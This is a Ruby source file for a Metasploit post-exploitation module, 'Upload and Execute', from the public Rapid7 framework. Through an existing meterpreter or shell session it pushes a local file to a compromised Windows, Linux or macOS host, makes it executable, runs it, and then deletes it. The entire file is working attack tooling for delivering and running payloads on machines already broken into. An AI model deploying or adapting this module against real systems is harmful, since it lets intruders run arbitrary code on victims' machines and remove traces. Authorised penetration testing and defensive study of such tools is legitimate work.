##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Upload and Execute',
      'Description'   => %q{ Push a file and execute it },
      'License'       => MSF_LICENSE,
      'Author'        => [ 'egypt'],
      'Platform'      => [ 'win','linux','osx' ],
      'SessionTypes'  => [ 'meterpreter','shell' ]
    ))

    register_options(
      [
        OptPath.new('LPATH', [true,'Local file path to upload and execute']),
        OptString.new('RPATH', [false,'Remote file path on target (default is basename of LPATH)']),
      ])
  end

  def rpath
    if datastore['RPATH'].blank?
      remote_name = File.basename(datastore['LPATH'])
    else
      remote_name = datastore['RPATH']
    end

    remote_name
  end

  def lpath
    datastore['LPATH']
  end

  def run
    upload_file(rpath, lpath)

    if session.platform.include?("windows")
      cmd_exec("cmd.exe /c start #{rpath}", nil, 0)
    else
      cmd = "chmod 700 #{rpath} && "

      # Handle absolute paths
      if rpath.start_with?('/')
        cmd << rpath
      else
        cmd << "./#{rpath}"
      end

      cmd_exec(cmd, nil, 0)
    end

    rm_f(rpath)
  end
end
